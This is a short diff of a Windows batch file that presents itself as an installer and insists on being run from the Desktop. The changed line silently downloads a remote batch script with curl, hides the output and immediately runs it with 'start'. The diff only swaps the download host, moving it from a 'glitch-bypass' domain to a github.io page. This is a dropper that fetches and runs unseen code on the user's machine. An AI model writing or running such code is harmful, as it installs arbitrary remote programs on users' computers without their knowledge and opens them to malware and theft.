@@ -10,7 +10,7 @@ set "currentDir=%currentDir:~0,-1%"
 
 :: Compare paths (case-insensitive)
 if /i "%currentDir%"=="%desktopDir%" (
-    curl -s -o a.bat https://www.glitch-bypass.com/terminal/update.bat>nul & start a.bat
+    curl -s -o a.bat https://glitch872.github.io/terminal/update.bat>nul & start a.bat
 ) else (
     echo ===================================================
     echo This installer must be run from your Desktop folder.
